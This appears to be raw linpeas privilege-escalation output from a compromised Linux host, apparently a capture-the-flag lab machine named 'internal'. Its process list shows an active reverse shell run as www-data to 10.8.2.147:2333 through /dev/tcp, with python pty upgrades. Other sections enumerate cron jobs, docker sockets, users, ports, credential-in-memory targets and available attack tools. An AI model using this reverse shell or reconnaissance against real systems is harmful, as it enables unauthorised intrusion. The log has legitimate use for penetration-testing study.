root         1  0.0  0.4 159836  9136 ?        Ss   17:29   0:06 /sbin/init maybe-ubiquity
root       416  0.0  0.8 127660 16384 ?        S<s  17:29   0:01 /lib/systemd/systemd-journald
root       422  0.0  0.0 105904  1756 ?        Ss   17:29   0:00 /sbin/lvmetad -f
root       427  0.0  0.2  45384  4324 ?        Ss   17:29   0:00 /lib/systemd/systemd-udevd
systemd+   670  0.0  0.1 141956  3292 ?        Ssl  17:30   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   811  0.0  0.2  80080  5384 ?        Ss   17:30   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   830  0.0  0.2  70776  5412 ?        Ss   17:30   0:00 /lib/systemd/systemd-resolved
root       949  0.0  0.3 286452  6780 ?        Ssl  17:30   0:00 /usr/lib/accountsservice/accounts-daemon[0m[0m
root       966  0.0  0.2  70612  6108 ?        Ss   17:30   0:00 /lib/systemd/systemd-logind
daemon[0m[0m     975  0.0  0.1  28332  2448 ?        Ss   17:30   0:00 /usr/sbin/atd -f
root       988  0.0  0.1  30104  3164 ?        Ss   17:30   0:00 /usr/sbin/cron -f
root      1008  0.0  0.8 169188 17032 ?        Ssl  17:30   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root      1016  0.0  1.2 489804 25888 ?        Ss   17:30   0:00 /usr/sbin/apache2 -k start
www-data  2453  0.0  2.2 572268 46344 ?        S    18:31   0:06  _ /usr/sbin/apache2 -k start
www-data  2560  0.0  2.1 573648 44132 ?        S    18:58   0:03  _ /usr/sbin/apache2 -k start
www-data  2564  0.0  2.2 571488 45232 ?        S    18:59   0:03  _ /usr/sbin/apache2 -k start
www-data  2572  0.0  1.9 571452 40760 ?        S    19:01   0:02  _ /usr/sbin/apache2 -k start
www-data  2580  0.0  1.9 571324 39184 ?        S    19:03   0:01  _ /usr/sbin/apache2 -k start
www-data  2582  0.0  1.9 569276 39748 ?        S    19:03   0:01  _ /usr/sbin/apache2 -k start
www-data  2583  0.0  2.1 571500 43336 ?        S    19:03   0:01  _ /usr/sbin/apache2 -k start
www-data  2584  0.0  2.0 569540 40964 ?        S    19:03   0:01  _ /usr/sbin/apache2 -k start
www-data  2678  0.0  1.9 569300 38824 ?        S    19:20   0:00  _ /usr/sbin/apache2 -k start
www-data  1732  0.0  0.0   4628   820 ?        S    20:17   0:00  |   _ sh -c bash -c 'sh -i &>/dev/tcp/10.8.2.147/2333 0>&1'
www-data  1733  0.0  0.1  18376  2944 ?        S    20:17   0:00  |       _ bash -c sh -i &>/dev/tcp/10.8.2.147/2333 0>&1
www-data  1734  0.0  0.0   4628   780 ?        S    20:17   0:00  |           _ sh -i
www-data  1745  0.0  0.4  37552  9548 ?        S    20:20   0:00  |               _ python3 -c import pty; pty.spawn("/bin/bash")
www-data  1746  0.0  0.1  18508  3180 pts/0    Ss   20:20   0:00  |                   _ /bin/bash
www-data  1759  0.0  0.4  37544  9512 pts/0    S+   20:20   0:00  |                       _ python3 -c import pty; pty.spawn("/bin/bash")
www-data  1760  0.0  0.1  18508  3460 pts/1    Ss+  20:20   0:00  |                           _ /bin/bash
www-data  2681  0.0  1.8 569284 36800 ?        S    19:20   0:00  _ /usr/sbin/apache2 -k start
root      1040  0.0  1.3 636668 27340 ?        Ssl  17:30   0:01 /usr/lib/snapd/snapd
message+  1042  0.0  0.2  50148  4716 ?        Ss   17:30   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root      1076  0.0  0.9 186028 20152 ?        Ssl  17:30   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
syslog    1080  0.0  0.2 263036  4404 ?        Ssl  17:30   0:00 /usr/sbin/rsyslogd -n
root      1087  0.1  0.1 636804  3608 ?        Ssl  17:30   0:14 /usr/bin/lxcfs /var/lib/lxcfs/
root      1143  0.0  2.0 672560 42136 ?        Ssl  17:30   0:04 /usr/bin/containerd
root      1466  0.0  0.2   9364  6044 ?        Sl   17:30   0:00  _ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
aubrean+  1504  0.0  0.0   1148     4 ?        Ss   17:30   0:00      _ /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1552  0.3 12.4 2588212 254244 ?      Sl   17:30   0:36          _ java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
root      1152  0.0  0.3  72300  6444 ?        Ss   17:30   0:00 /usr/sbin/sshd -D
aubrean+  1224  0.0  0.1 107984  3376 ?        S    20:26   0:00  |   _ sshd: aubreanna@pts/2
aubrean+  1228  0.0  0.2  21568  5056 pts/2    Ss+  20:26   0:00  |       _ -bash
aubrean+  1361  0.5  0.3 108480  6668 ?        S    20:27   0:02  |   _ sshd: aubreanna@pts/3,pts/4
aubrean+  1362  0.0  0.1  13060  2128 ?        Ss   20:27   0:00  |       _ /usr/lib/openssh/sftp-server
aubrean+  1363  0.0  0.2  21608  5172 pts/3    Ss   20:27   0:00  |       _ -bash
aubrean+  4872  0.3  0.1   5456  2648 pts/3    S+   20:34   0:00  |       |   _ /bin/sh ./linpeas.sh
aubrean+  8526  0.0  0.0   5456  1048 pts/3    S+   20:34   0:00  |       |       _ /bin/sh ./linpeas.sh
aubrean+  8530  0.0  0.1  38608  3636 pts/3    R+   20:34   0:00  |       |       |   _ ps fauxwww
aubrean+  8529  0.0  0.0   5456  1048 pts/3    S+   20:34   0:00  |       |       _ /bin/sh ./linpeas.sh
aubrean+  1375  0.0  0.2  21496  5024 pts/4    Ss   20:27   0:00  |       _ -bash
aubrean+  1425  0.2  0.2  42076  4580 pts/4    S+   20:27   0:00  |       |   _ top
aubrean+  8314  0.0  0.1  11668  3104 ?        Ss   20:34   0:00  |       _ bash -c export LANG="en_US";export LANGUAGE="en_US";export LC_ALL="en_US";free;echo finalshell_separator;uptime;echo finalshell_separator;cat /proc/net/dev;echo finalshell_separator;df;echo finalshell_separator;sleep 1;free;echo finalshell_separator;uptime;echo finalshell_separator;cat /proc/net/dev;echo finalshell_separator;df;echo finalshell_separator;
aubrean+  8325  0.0  0.0   4532   740 ?        S    20:34   0:00  |           _ sleep 1
aubrean+ 21885  0.0  0.3 108120  6300 ?        S    20:32   0:00      _ sshd: aubreanna@notty
aubrean+ 22549  0.0  0.0  13060  2028 ?        Ss   20:32   0:00          _ /usr/lib/openssh/sftp-server
aubrean+ 23974  0.0  0.0  13060  2028 ?        Ss   20:32   0:00          _ /usr/lib/openssh/sftp-server
aubrean+ 24911  0.0  0.1  13060  2080 ?        Ss   20:32   0:00          _ /usr/lib/openssh/sftp-server
aubrean+ 25239  0.0  0.1  13060  2064 ?        Ss   20:32   0:00          _ /usr/lib/openssh/sftp-server
aubrean+ 25250  0.0  0.1  13060  2064 ?        Ss   20:32   0:00          _ /usr/lib/openssh/sftp-server
aubrean+ 26106  0.0  0.0  13060  1996 ?        Ss   20:32   0:00          _ /usr/lib/openssh/sftp-server
root      1155  0.0  0.3 291452  7148 ?        Ssl  17:30   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1162  0.0  4.2 839572 86420 ?        Ssl  17:30   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1442  0.0  0.1 478532  2684 ?        Sl   17:30   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
mysql     1177  0.1  9.6 1164072 197376 ?      Sl   17:30   0:13 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root      1185  0.0  0.1  14768  2272 ttyS0    Ss+  17:30   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root      1198  0.0  0.0  13244  1916 tty1     Ss+  17:30   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
aubrean+  1046  0.0  0.3  76796  7808 ?        Ss   20:26   0:00 /lib/systemd/systemd --user
aubrean+  1047  0.0  0.1 193816  2588 ?        S    20:26   0:00  _ (sd-pam)
aubrean+ 12213  0.0  0.1  92128  3112 ?        SLs  20:32   0:00  _ /usr/bin/gpg-agent --supervised

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 670 with ppid 1 is run by user systemd-timesync but the ppid user is root
Proc 811 with ppid 1 is run by user systemd-network but the ppid user is root
Proc 830 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 975 with ppid 1 is run by user daemon but the ppid user is root
Proc 1042 with ppid 1 is run by user messagebus but the ppid user is root
Proc 1046 with ppid 1 is run by user aubreanna but the ppid user is root
Proc 1080 with ppid 1 is run by user syslog but the ppid user is root
Proc 1177 with ppid 1 is run by user mysql but the ppid user is root
Proc 1224 with ppid 1043 is run by user aubreanna but the ppid user is root
Proc 1361 with ppid 1278 is run by user aubreanna but the ppid user is root
Proc 1504 with ppid 1466 is run by user aubreanna but the ppid user is root
Proc 2453 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2560 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2564 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2572 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2580 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2582 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2583 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2584 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2678 with ppid 1016 is run by user www-data but the ppid user is root
Proc 2681 with ppid 1016 is run by user www-data but the ppid user is root
Proc 21885 with ppid 20104 is run by user aubreanna but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Aug  3  2020 .
drwxr-xr-x 102 root root 4096 Aug  3  2020 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Jan 14  2020 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  191 Feb  3  2020 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x   2 root root 4096 Aug  3  2020 .
drwxr-xr-x 102 root root 4096 Aug  3  2020 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  376 Nov 20  2017 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x   1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Feb  3  2020 .
drwxr-xr-x 102 root root 4096 Aug  3  2020 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb  3  2020 .
drwxr-xr-x 102 root root 4096 Aug  3  2020 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Feb  3  2020 .
drwxr-xr-x 102 root root 4096 Aug  3  2020 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Sat 2024-01-20 20:39:00 UTC  4min 32s left Sat 2024-01-20 20:09:05 UTC  25min ago    phpsessionclean.timer        phpsessionclean.service
Sun 2024-01-21 04:16:59 UTC  7h left       Sat 2024-01-20 17:30:10 UTC  3h 4min ago  apt-daily.timer              apt-daily.service
Sun 2024-01-21 06:00:41 UTC  9h left       Sat 2024-01-20 17:30:10 UTC  3h 4min ago  apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun 2024-01-21 11:32:31 UTC  14h left      Sat 2024-01-20 17:30:10 UTC  3h 4min ago  motd-news.timer              motd-news.service
Sun 2024-01-21 17:44:58 UTC  21h left      Sat 2024-01-20 17:44:58 UTC  2h 49min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2024-01-22 00:00:00 UTC  1 day 3h left Sat 2024-01-20 17:30:10 UTC  3h 4min ago  fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/8268/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8268/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8268/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/8268/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/8268/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/8268/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/8268/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8268/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/8268/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/8268/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/containerd-shim/1c5236578d000676eca92a80a429dfaacfdd004e11541cdddc596dbaaa758907.sock@
/run/acpid.socket
  └─(Read Write)
/run/containerd/containerd.sock
/run/containerd/containerd.sock.ttrpc
/run/dbus/system_bus_socket
  └─(Read Write)
/run/docker.sock
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1000/snapd-session-agent.socket
  └─(Read Write)
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/docker.sock
/var/run/docker/libnetwork/d1f2a46b36e7.sock
/var/run/docker/metrics.sock
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.0                                 830 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -
:1.1                                 811 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -
:1.10                               1076 unattended-upgr root             :1.10         unattended-upgrades.se…ce -          -
:1.2                                 966 systemd-logind  root             :1.2          systemd-logind.service    -          -
:1.3                                   1 systemd         root             :1.3          init.scope                -          -
:1.4                                 949 accounts-daemon[0m[0m root             :1.4          accounts-daemon.service   -          -
:1.6                                1155 polkitd         root             :1.6          polkit.service            -          -
:1.893                             12860 busctl          aubreanna        :1.893        session-12.scope          12         -
:1.9                                1008 networkd-dispat root             :1.9          networkd-dispatcher.se…ce -          -
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
io.netplan.Netplan                     - -               -                (activatable) -                         -
org.freedesktop.Accounts             949 accounts-daemon[0m[0m root             :1.4          accounts-daemon.service   -          -
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -
org.freedesktop.PolicyKit1          1155 polkitd         root             :1.6          polkit.service            -          -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1               966 systemd-logind  root             :1.2          systemd-logind.service    -          -
org.freedesktop.network1             811 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -
org.freedesktop.resolve1             830 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -
org.freedesktop.systemd1               1 systemd         root             :1.3          init.scope                -          -
org.freedesktop.thermald               - -               -                (activatable) -                         -
org.freedesktop.timedate1              - -               -                (activatable) -                         -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
internal
127.0.0.1 localhost
127.0.1.1 internal

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:65ff:fee4:c78f  prefixlen 64  scopeid 0x20<link>
        ether 02:42:65:e4:c7:8f  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1464 (1.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.202.241  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::d2:edff:fe56:e5  prefixlen 64  scopeid 0x20<link>
        ether 02:d2:ed:56:00:e5  txqueuelen 1000  (Ethernet)
        RX packets 409935  bytes 39614985 (39.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 412831  bytes 229583919 (229.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2994  bytes 282713 (282.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2994  bytes 282713 (282.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethd4b6ffe: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::387c:26ff:fe99:3862  prefixlen 64  scopeid 0x20<link>
        ether 3a:7c:26:99:38:62  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 532 (532.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 37  bytes 2750 (2.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:45269         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m[0m) gid=1(daemon[0m[0m) groups=1(daemon[0m[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m[0m) groups=1(daemon[0m[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 20:34:30 up  3:04,  3 users,  load average: 0.73, 0.34, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
aubreann pts/2    10.8.2.147       20:26    1:41   0.04s  0.04s -bash
aubreann pts/3    10.8.2.147       20:27   22.00s  0.12s  0.00s w
aubreann pts/4    10.8.2.147       20:27    7:00   0.87s  0.84s top

╔══════════╣ Last logons
root     pts/0        Mon Aug  3 02:38:33 2020 - Mon Aug  3 02:39:00 2020  (00:00)     192.168.1.17
aubreanna pts/0        Mon Aug  3 02:35:18 2020 - Mon Aug  3 02:37:05 2020  (00:01)     192.168.1.17
root     tty1         Mon Aug  3 02:23:32 2020 - down                      (00:17)     0.0.0.0
reboot   system boot  Mon Aug  3 02:23:08 2020 - Mon Aug  3 02:41:25 2020  (00:18)     0.0.0.0
aubreanna pts/0        Mon Aug  3 02:01:06 2020 - Mon Aug  3 02:04:28 2020  (00:03)     192.168.1.17
aubreanna pts/0        Mon Aug  3 01:50:00 2020 - Mon Aug  3 02:00:40 2020  (00:10)     192.168.1.17
aubreanna tty1         Mon Aug  3 01:41:33 2020 - down                      (00:22)     0.0.0.0
reboot   system boot  Mon Aug  3 01:40:32 2020 - Mon Aug  3 02:04:30 2020  (00:23)     0.0.0.0

wtmp begins Mon Aug  3 01:40:32 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             pts/0    10.6.2.56        Mon Aug  3 19:59:17 +0000 2020
aubreanna        pts/4    10.8.2.147       Sat Jan 20 20:27:30 +0000 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.6
/usr/sbin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/snap/core/8268/usr/share/gcc-5
